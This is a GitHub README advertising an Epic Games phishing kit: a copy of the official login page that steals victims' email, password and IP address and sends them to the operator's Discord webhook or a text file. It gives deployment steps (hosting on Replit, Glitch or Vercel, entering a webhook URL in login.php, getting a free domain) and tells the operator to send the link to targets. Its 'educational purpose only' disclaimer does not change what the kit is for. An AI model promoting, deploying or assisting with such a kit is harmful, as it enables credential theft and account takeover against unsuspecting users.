##### [🌍 Discord Server](https://discord.gg/rNbcUvV7) [💡 Features](https://github.com/Ib69/fortnite-phishing/blob/main/README.md#---features) [❓ How to Setup ?](https://github.com/Ib69/fortnite-phishing/blob/main/README.md#---how-to-setup-) [❓ How do its work ?](https://github.com/Ib69/epic-games-phishing/blob/main/README.md#---how-do-its-work-) [❓ How do its work ?](https://github.com/Ib69/epic-games-phishing#---some-screens-)

# 🎣 - Epic Games Phishing Page:
Epic Games Phishing Page working with Discord webhook or save it on a .txt file.

# 📋 - Terms
- [x] Educational purpose only
- [x] Reselling is forbidden
- [x] I am **NOT** responsible of anything you do with our software
- [ ] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
- [ ] This code is only a basic source code, so if you want to change, modify, update it, you can

# 📜 - Features:

- Steal Epic Game Infos
  - Mail
  - Password
  - IP
- Save Infos On A .txt file
- Steal User's Ip
- Copy of the official Epic Game Login Page

# ❓ - How to Setup ?
1. Download the Source code
2. Upload it on a host like Replit, Glitch, Vercel (Im using Replit)
4. Go in `login.php`, and put your webhook url. (You can enable ping too)
5. Then Your program is ready !
(if you want to setup a free domain to your website, i recommend to use [Freenom](https://www.freenom.com). You can setup your domain by following a youtube tutorial its easy dont worry)

# ❓ - How do its work ?
Copy the link and send it to someone idk 🤷‍♂️.
Then when the user loggin, you are going to recive the webhook embed with all infos [Exemple here](https://github.com/Ib69/epic-games-phishing#---some-screens)
There is 2 files with the infos that are going to be created in case your webhook get deleted or if you server got deleted, again, idk 🤷‍♂️.

# 📷 - Some Screens...

**The website look like:**
<a href="https://imgur.com/2kb3lvt"><img src="https://i.imgur.com/2kb3lvt.png" title="source: imgur.com" /></a>

**The embed look like.**
<a href="https://imgur.com/hSSqnwF"><img src="https://i.imgur.com/hSSqnwF.png" title="source: imgur.com" /></a>
